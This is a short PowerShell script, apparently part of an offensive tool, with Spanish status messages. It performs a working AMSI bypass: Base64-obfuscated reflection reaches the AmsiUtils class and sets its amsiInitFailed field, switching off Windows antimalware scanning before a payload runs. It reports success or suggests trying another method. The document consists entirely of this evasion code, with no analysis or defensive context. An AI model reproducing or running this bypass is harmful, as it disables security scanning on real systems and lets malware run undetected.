Write-Host
Write-Host "Codificando el siguiente payload:" -ForegroundColor Yellow
try
{  
    [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
    Write-Host
    Write-Host "---> AMSI bypass Conseguido!"-ForegroundColor Green -BackgroundColor DarkBlue
    Write-Host
    pause
    Clear-Host
}
catch
{
    Write-Host
    Write-Host "---> No ha funcionado, intente otro método" -ForegroundColor Red -BackgroundColor Yellow
    pause
    Clear-Host
}
break;
